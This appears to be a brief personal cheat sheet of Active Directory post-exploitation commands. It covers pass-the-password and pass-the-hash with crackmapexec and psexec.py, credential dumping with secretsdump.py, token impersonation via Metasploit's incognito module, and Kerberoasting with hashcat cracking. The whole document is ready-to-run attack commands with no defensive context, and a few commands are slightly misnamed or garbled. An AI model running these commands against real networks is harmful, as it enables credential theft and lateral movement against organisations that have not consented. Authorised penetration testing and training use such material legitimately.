# Post-Exploitation Attack

## Pass The Password
**Tools used**
1. crackmapexec
2. msfconsole

**CMDS:**
1. crackmapexec smb IP/CIDR -u  DomainUser -d Domain.ext -p ThePassword 
2. psexec.py DomainName.ext/DomainUser:ThePassword@IP

**Dumping Hash with secretsdump.py**
1. secretsdump.py DomainName/Domainuser:ThePassword@IP

## Pass The Hash attack

1. Get NTLM(not NTLMv2) by secretsdump.py
2. crackmapexec smb IP/CIDR -u User name -H \<hash\>
3. psexec.py "User Name":@IP -hashes LMHASH:NTHASH

## Token Impersonation
DELEGATE TOKENS ARE CREATED FROM LOGIN AND STAY TILL IMPERSONATE
1. msfconsole
2. use windows/smb/psexec
3.  set options 
4.  load -l 
5.  load incognito
6.  list_token -u/-g
7.  impersonate_token DOMAINNAME\\USERNAME
8.  shell

## Kerberoasting
1. GetUserSPN.py Domain.ext/DomainUser:Password -dc-ip IPofDC -request
2. copy the hash recieved
3. hashcat --help | grep kerberos
4. hashcat -a 0 -m 13100 hashed.txt rockyou.txt -O

